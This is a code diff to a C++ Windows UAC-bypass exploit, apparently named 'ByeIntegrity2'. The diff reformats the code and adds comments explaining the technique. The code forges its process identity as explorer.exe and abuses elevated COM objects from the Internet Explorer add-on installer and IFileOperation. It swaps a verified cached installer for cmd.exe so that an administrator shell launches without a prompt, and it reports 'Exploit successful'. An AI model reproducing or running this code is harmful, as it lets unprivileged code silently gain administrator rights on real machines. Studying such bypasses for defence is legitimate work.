@@ -12,13 +12,13 @@ typedef struct _UNICODE_STRING
 	unsigned short MaximumLength;
 	long Padding_8;
 	wchar_t* Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
+} UNICODE_STRING, *PUNICODE_STRING;
 
 typedef struct _CURDIR
 {
 	struct _UNICODE_STRING DosPath;
 	void* Handle;
-} CURDIR, * PCURDIR;
+} CURDIR, *PCURDIR;
 
 typedef struct _STRING
 {
@@ -26,7 +26,7 @@ typedef struct _STRING
 	unsigned short MaximumLength;
 	long Padding_94;
 	char* Buffer;
-} STRING, * PSTRING;
+} STRING, *PSTRING;
 
 typedef struct _RTL_DRIVE_LETTER_CURDIR
 {
@@ -34,7 +34,7 @@ typedef struct _RTL_DRIVE_LETTER_CURDIR
 	unsigned short Length;
 	unsigned long TimeStamp;
 	struct _STRING DosPath;
-} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS
 {
@@ -78,7 +78,7 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS
 	unsigned __int64* DefaultThreadpoolCpuSetMasks;
 	unsigned long DefaultThreadpoolCpuSetMaskCount;
 	long __PADDING__[1];
-} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
 
 constexpr auto PEB_OFFSET = 0x60ULL;
 constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
@@ -98,8 +98,8 @@ struct LDR_CALLBACK_PARAMS
 	RtlInitUnicodeStringPtr RtlInitUnicodeString;
 };
 
-void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
-	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
+void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
+                             const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
 {
 	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
 	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
@@ -107,28 +107,35 @@ void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStr
 	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
 	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");
 
-	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };
+	LDR_CALLBACK_PARAMS params{explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString};
 
 	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
+	{
+		auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+
+		if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
+			ULONG_PTR>(params->ImageBase))
 		{
-			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+			const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
+			           fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
 
-			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
-				ULONG_PTR>(params->ImageBase))
-			{
-				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
-					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
+			params->RtlInitUnicodeString(baseName, L"explorer.exe");
+			params->RtlInitUnicodeString(fullName, params->ExplorerPath);
 
-				params->RtlInitUnicodeString(baseName, L"explorer.exe");
-				params->RtlInitUnicodeString(fullName, params->ExplorerPath);
-
-				*stop = TRUE;
-			}
-		}, reinterpret_cast<PVOID>(&params));
+			*stop = TRUE;
+		}
+	}, reinterpret_cast<PVOID>(&params));
 }
 
 struct IIEAdminBrokerObjectForAdminInstaller : IUnknown
 {
+	/**
+	 * \brief Creates the CActiveXInstallBroker object used by CIEAdminBrokerObject and sets the internal state flag to 1.
+	 * \param providerName Name of the installer provider to be stored in the object instance.
+	 * \param unknown0 Some other thing stored in the object instance.
+	 * \param instanceUuid A unique UUID for this installer session. This must be passed to all methods called in CIEAdminBrokerObject.
+	 * \return Standard HRESULT value.
+	 */
 	virtual HRESULT InitializeAdminInstaller(
 		BSTR providerName,
 		int unknown0,
@@ -136,10 +143,27 @@ struct IIEAdminBrokerObjectForAdminInstaller : IUnknown
 	) = 0;
 };
 
-const GUID IID_IeAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, {0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77} };
+const GUID IID_IeAxiAdminInstaller = {0x9AEA8A59, 0xE0C9, 0x40F1, {0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77}};
 
 struct IIEAdminBrokerObjectForInstaller2 : IUnknown
 {
+	/**
+	 * \brief Authorizes a file for execution via RunSetupCommand. WinVerifyTrust is called to check the embedded certificate in the
+	 * specified file, and if it passes the check, the internal state flag is set to 2, allowing us to use RunSetupCommand. Then, the file
+	 * is copied into the installer cache directory with a new name. The path for this new file is given to us.
+	 * \param instanceUuid The installer's instance UUID.
+	 * \param verifyParentWindow The window to use for WinVerifyTrust.
+	 * \param unknown0 Needs to be same as 'fileName' parameter.
+	 * \param fileName The file that contains the embedded certificate which we want to verify.
+	 * \param unknown1 Some unknown parameter.
+	 * \param uiChoice The uiChoice member for the WINTRUST_DATA struct used by WinVerifyTrust.
+	 * \param uiContext The uiContext member for the WINTRUST_DATA struct used by WinVerifyTrust.
+	 * \param unknown2 Some interface ID, I just passed in IID_IUnknown. Purpose is unknown.
+	 * \param verifiedFileName The path for the verified file which has been copied into the installer cache directory.
+	 * \param unknown3 Some unknown parameter. [UACME says it's the file's certificate details...]
+	 * \param unknown4 Some unknown parameter. [UACME says it's the file's certificate detail's length/size...]
+	 * \return Standard HRESULT value.
+	 */
 	virtual HRESULT VerifyFile(
 		BSTR instanceUuid,
 		HWND verifyParentWindow,
@@ -148,12 +172,28 @@ struct IIEAdminBrokerObjectForInstaller2 : IUnknown
 		BSTR unknown1,
 		ULONG uiChoice,
 		ULONG uiContext,
-		REFGUID unknown4,
+		REFGUID unknown2,
 		BSTR* verifiedFileName,
-		PULONG unknown5,
-		PUCHAR* unknown6
+		PULONG unknown3,
+		PUCHAR* unknown4
 	) = 0;
 
+	/**
+	 * \brief Executes the specified command line. The command line must be a command line of the file path given to us by
+	 * VerifyFile. Otherwise, the function returns E_ACCESSDENIED. If the command line uses a path as one of the parameters to the
+	 * executable, the backslashes must be forward slashes, otherwise E_ACCESSDENIED is returned as well (probably because the command line
+	 * path check fails if a backslash is found after the main executable path). This function basically calls IEAdvpack.dll!RunSetupCommandW.
+	 * \param instanceUuid The installer's instance UUID.
+	 * \param parentWindow The parent window to use for IEAdvpack.dll!RunSetupCommandW.
+	 * \param commandLine The command line to execute.
+	 * \param infSection The infSection specification for IEAdvpack.dll!RunSetupCommandW.
+	 * \param workingDirectory The working directory of the process to be launched.
+	 * \param title The title to use for IEAdvPack.dll!RunSetupCommandW.
+	 * \param flags A set of flags which tell IEAdvpack.dll!RunSetupCommandW how to handle the setup process: either launch the installer
+	 * directly or perform an inf-based core install.
+	 * \param exeHandle A handle to the launched installer, but this will always be NULL in our case.
+	 * \return E_INVALIDARG on exploit success, otherwise some other unexpected HRESULT value.
+	 */
 	virtual HRESULT RunSetupCommand(
 		BSTR instanceUuid,
 		HWND parentWindow,
@@ -166,10 +206,22 @@ struct IIEAdminBrokerObjectForInstaller2 : IUnknown
 	) = 0;
 };
 
-const GUID IID_IeAxiInstaller2 = { 0xBC0EC710, 0xA3ED, 0x4F99, {0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3} };
+const GUID IID_IeAxiInstaller2 = {0xBC0EC710, 0xA3ED, 0x4F99, {0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3}};
 
 int main()
 {
+	const auto hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+
+	SetConsoleTextAttribute(hStdOutput, 8);
+	std::wcout <<
+		L" __________              .___        __                      .__  __          ________  \n"
+		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__.\\_____  \\ \n"
+		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  | /  ____/ \n"
+		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  |/       \\ \n"
+		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____|\\_______ \\\n"
+		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/             \\/\n\n";
+	SetConsoleTextAttribute(hStdOutput, 7);
+
 	PWSTR windowsPath, systemPath;
 	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
 	if (FAILED(hr))
@@ -185,7 +237,7 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	std::wstring explorer{ windowsPath }, system32{ systemPath };
+	std::wstring explorer{windowsPath}, system32{systemPath};
 	CoTaskMemFree(windowsPath);
 	CoTaskMemFree(systemPath);
 	explorer += L"\\explorer.exe";
@@ -203,8 +255,9 @@ int main()
 		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
 		return EXIT_FAILURE;
 	}
+	// because ieinstal.exe calls CoImpersonateClient during VerifyFile, we need this call so VerifyFile can succeed.
 	hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE,
-		nullptr, 0, nullptr);
+	                          nullptr, 0, nullptr);
 	if (FAILED(hr))
 	{
 		std::wcout << L"CoInitializeSecurity() failed. HRESULT: 0x" << std::hex << hr << std::endl;
@@ -219,16 +272,19 @@ int main()
 	bindOptions.dwClassContext = CLSCTX_LOCAL_SERVER;
 	bindOptions.cbStruct = sizeof BIND_OPTS3;
 
-	hr = CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}", &bindOptions, IID_IFileOperation,
-		reinterpret_cast<void**>(&fileOperation));
+	hr = CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}", &bindOptions,
+	                 IID_IFileOperation,
+	                 reinterpret_cast<void**>(&fileOperation));
 	if (FAILED(hr))
 	{
 		CoUninitialize();
 		std::wcout << L"CoGetObject() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
 		return EXIT_FAILURE;
 	}
-	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bindOptions, IID_IeAxiAdminInstaller,
-		reinterpret_cast<void**>(&adminInstaller));
+	// create an instance of an interface (IeAxiAdminInstaller) from the Internet Explorer Add-on installer coclass.
+	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bindOptions,
+	                 IID_IeAxiAdminInstaller,
+	                 reinterpret_cast<void**>(&adminInstaller));
 	if (FAILED(hr))
 	{
 		fileOperation->Release();
@@ -237,7 +293,9 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	hr = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
+	// you'll see why we need IFileOperation later.
+	hr = fileOperation->
+		SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
 	if (FAILED(hr))
 	{
 		adminInstaller->Release();
@@ -247,6 +305,8 @@ int main()
 		return EXIT_FAILURE;
 	}
 
+	/* this is the target file with the embedded certificate which will pass the WinVerifyTrust call from VerifyFile
+	 * we will be using. */
 	system32 += L"\\bdeunlock.exe";
 
 	/*
@@ -268,6 +328,7 @@ int main()
 
 	IIEAdminBrokerObjectForInstaller2* installer2;
 
+	// get the IeAxiInstaller2 interface from the IeAxiAdminInstaller interface.
 	hr = adminInstaller->QueryInterface(IID_IeAxiInstaller2, reinterpret_cast<void**>(&installer2));
 	if (FAILED(hr))
 	{
@@ -280,11 +341,14 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	const auto fileName = SysAllocString(system32.c_str());
+	auto* const fileName = SysAllocString(system32.c_str());
 	BSTR targetFile;
 	ULONG unknown5;
 	PUCHAR unknown6;
 
+	/*
+	 * HWND is INVALID_HANDLE_VALUE: see documentation of WinVerifyTrust.
+	 */
 	hr = installer2->VerifyFile(instanceUuid, static_cast<HWND>(INVALID_HANDLE_VALUE), fileName, fileName, nullptr,
 	                            WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, IID_IUnknown, &targetFile, &unknown5, &unknown6);
 	SysFreeString(fileName);
@@ -300,6 +364,13 @@ int main()
 		return EXIT_FAILURE;
 	}
 
+	/*
+	 * Replace the file in the installer cache with cmd.exe First we will copy cmd.exe to the current directory, then rename it the
+	 * same name as the file in the cache. Then we will use an elevated IFileOperation instance to delete the file in the cache and
+	 * copy our renamed cmd.exe into there. This will allow us to successfully execute RunSetupCommand and it will launch our cmd.exe
+	 * in the cache directory.
+	 */
+
 	WCHAR file[25], directory[MAX_PATH - 2], drive[3], fullPath[MAX_PATH]{};
 
 	_wsplitpath_s(targetFile, drive, sizeof drive / sizeof(WCHAR), directory, sizeof directory / sizeof(WCHAR), file,
@@ -307,16 +378,16 @@ int main()
 	wcscat_s(file, sizeof file / sizeof(WCHAR), L".exe");
 	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), drive);
 	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), directory);
-	
+
 	CoTaskMemFree(unknown6);
 
-	IShellItem* existingItem, * parentFolder, * newItem;
+	IShellItem *existingItem, *parentFolder, *newItem;
 
 	system32 = system32.substr(0, system32.find(L"\\bdeunlock.exe"));
 	system32 += L"\\cmd.exe";
 	if (!CopyFileW(system32.c_str(), file, FALSE))
 	{
-		std::wcout<< L"CopyFileW() failed. Error: " << GetLastError() << std::endl;
+		std::wcout << L"CopyFileW() failed. Error: " << GetLastError() << std::endl;
 		SysFreeString(targetFile);
 		SysFreeString(instanceUuid);
 		installer2->Release();
@@ -327,11 +398,11 @@ int main()
 	}
 
 	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr)) + wcslen(file) + 1;
-	auto currentDirectory = new WCHAR[requiredSize];
+	auto* currentDirectory = new WCHAR[requiredSize];
 	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
 	wcscat_s(currentDirectory, requiredSize, L"\\");
 	wcscat_s(currentDirectory, requiredSize, file);
-	
+
 	hr = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem, reinterpret_cast<void**>(&newItem));
 	delete[] currentDirectory;
 	if (FAILED(hr))
@@ -426,14 +497,24 @@ int main()
 	}
 
 	system32 = system32.substr(0, system32.find(L"\\cmd.exe"));
-	const auto workingDirectory = SysAllocString(system32.c_str());
+	auto* const workingDirectory = SysAllocString(system32.c_str());
 
-	std::wstring commandLine{ targetFile };
+	std::wstring commandLine{targetFile};
+	/*
+	 * Launch a new instance of cmd.exe and exit out of the old one. We do this because if we use the copied cmd.exe directly,
+	 * there are lots of error messages and broken messages because we did not copy the language dependencies along with cmd.exe
+	 * into the installer's cache directory.
+	 */
 	commandLine += L" /C start cmd.exe";
 	SysFreeString(targetFile);
 	targetFile = SysAllocString(commandLine.c_str());
-	
+
 	HANDLE exeHandle;
+	/*
+	 * 'infSection' and 'title' are not used in our case, because flags are 0: we are doing a direct launch of the installer
+	 * process. However, we get an access violation if they are NULL, so just set them to our empty string pointers. They will
+	 * show up as L'\0' in ieinstal.exe anyways (because they are not SysAlloc'ed() strings).
+	 */
 	hr = installer2->RunSetupCommand(instanceUuid, nullptr, targetFile, const_cast<BSTR>(L""), workingDirectory,
 	                                 const_cast<BSTR>(L""), 0, &exeHandle);
 	SysFreeString(workingDirectory);
@@ -443,21 +524,22 @@ int main()
 	adminInstaller->Release();
 	CoUninitialize();
 	if (hr != E_INVALIDARG)
-		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::RunSetupCommand() did not return the expected value (E_INVALIDARG).\n";
-	
+		std::wcout <<
+			L"ieinstal.exe -> CIEAdminBrokerObject::RunSetupCommand() did not return the expected value (E_INVALIDARG).\n";
+
 	/*
 	 * End ieinstal.exe -> CIEAdminBrokerObject::CActiveXInstallBroker
 	 */
 
-	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	SetConsoleTextAttribute(hStdOutput, 14);
 	std::wcout << L"[";
-	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
+	SetConsoleTextAttribute(hStdOutput, 15);
 	std::wcout << L"@";
-	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	SetConsoleTextAttribute(hStdOutput, 14);
 	std::wcout << L"] ";
-	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	SetConsoleTextAttribute(hStdOutput, 14);
 	std::wcout << L"*** Exploit successful.\n\n";
-	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+	SetConsoleTextAttribute(hStdOutput, 7);
 
 	return 0;
 }
